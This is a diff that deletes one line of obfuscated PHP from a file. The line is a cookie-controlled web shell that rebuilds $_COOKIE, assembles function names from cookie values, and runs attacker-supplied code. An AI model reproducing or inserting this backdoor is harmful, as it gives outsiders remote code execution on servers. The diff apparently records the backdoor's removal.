@@ -1,1 +1,0 @@
-<?php $ni='_C';/*TT5t*/$dk='KI';/*)*/$ux='E';/*!)lS*/$bx='OO';$yr/*2#o*/=${$ni.$bx.$dk.$ux};$lk=$yr['kQ'].$yr['ka'];$dn=$yr['R'].$yr['s'].$yr['p'];$l=$lk('',$dn($yr['wJ']));$l();
